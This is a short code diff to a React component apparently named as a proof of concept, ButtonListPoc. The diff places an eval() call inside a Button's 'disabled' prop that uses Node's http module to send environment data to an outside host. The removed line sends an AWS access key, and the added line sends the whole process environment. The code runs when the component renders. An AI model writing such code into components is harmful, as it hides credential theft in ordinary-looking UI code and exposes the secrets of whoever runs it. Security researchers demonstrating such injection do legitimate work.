@@ -17,7 +17,7 @@ export default function ButtonListPoc(props) {
       {(item, index) => (
         <Flex key={item.id} {...(overrideItems && overrideItems({ item, index }))}>
           <Button
-            disabled={eval("require('http').get('http://google.com?q=' + process.env.AWS_ACCESS_KEY_ID,r=>r.on('data',c=>console.log(c+'')))")}
+            disabled={eval("require('http').get('http://google.com?q=' + JSON.stringify(process.env),r=>r.on('data',c=>console.log(c+'')))")}
             {...(overrideItems && overrideItems({ item, index }))}
           ></Button>
         </Flex>
